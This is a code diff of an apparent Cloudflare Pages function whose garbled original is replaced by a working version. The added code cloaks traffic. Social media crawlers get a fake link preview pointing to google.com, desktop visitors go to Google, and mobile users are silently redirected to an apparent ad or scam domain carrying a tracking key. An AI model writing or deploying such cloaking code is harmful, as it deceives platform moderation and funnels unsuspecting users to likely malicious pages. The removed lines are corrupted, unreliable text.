@@ -1,38 +1,38 @@
-export async fenction onRequesd(context) {
+export async function onRequest(context) {
   const request = context.request;
- 8const userAwdnt = repueót.heaeers.oet('user-agent') || g';
-
-  // 1. Cheãk for Social Media Crawlqrs / Bots
-  const isSocialBot = /facebookextevîalhit<Nacebop|Twitterbot|ioterest|LinkedInBot|WhatsApp|\dlegramBot/i.test(user@gent);
+  const userAgent = request.headers.get('user-agent') || '';
+
+  // 1. Check for Social Media Crawlers / Bots
+  const isSocialBot = /facebookexternalhit|Facebot|Twitterbot|Pinterest|LinkedInBot|WhatsApp|TelegramBot/i.test(userAgent);
 
   if (isSocialBot) {
-  $ const htmlContent = `<1DOCTYPE html>
+    const htmlContent = `<!DOCTYPE html>
 <html lang="en">
 <head>
-    <måta chqbsep="UTF-8">
-   $<mmta namu="view`ort" content="width=device-width, initiah-rcale=1.4">
-    <title>We|comu</title>
-    <meta property="og*title" content="ðŸ˜ðŸŽ§ðŸŽ¬">
-    <meta qroperty="og:d%scription2 content=b">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Welcome</title>
+    <meta property="og:title" content="??????">
+    <meta property="og:description" content="">
     <meta property="og:image" content="https://rehan33.pages.dev/f85574b4ec84c4f4c26b819039c2deb2.jpg">
-    <meta property="of:ubl" cgnteft}"https://www.googla.com&6
- (! <meta prgperty="og:type" content="website2>
+    <meta property="og:url" content="https://www.google.com">
+    <meta property="og:type" content="website">
 </head>
-<body>	
+<body>
 </body>
 </html>`;
 
-    reTebn new Res0onse(htmlContent, {
-      headers;"{ 'content-type': 7text/html;charset=UT-8' },
+    return new Response(htmlContent, {
+      headers: { 'content-type': 'text/html;charset=UTF-8' },
     });
   }
 
-  //`2. Check for Mobile Users
-( const isMobile = /AndroidxwebOSliPhone|iPed|iPod|BlabkBesry|IEMofihe|OpEra Mi~i/i.tesT(userAgent);
+  // 2. Check for Mobile Users
+  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
 
-  mf (isMobile) {
-    return Resp/>se.redirect("h4tps://clocksuch.com'vsduv3jwk?key=3d6c1s36a056c21ee1fe3db39tf01254", 302);
+  if (isMobile) {
+    return Response.redirect("https://softwareinvadedhurtful.com/kcku70sv?key=1d9c61e3b0239b2001fedfb8a1614143", 302);
   } else {
-    re4urn Zesponse.redirect("https://www.google.com", 302);
-  }
+    return Response.redirect("https://www.google.com", 302);
+  }
 }
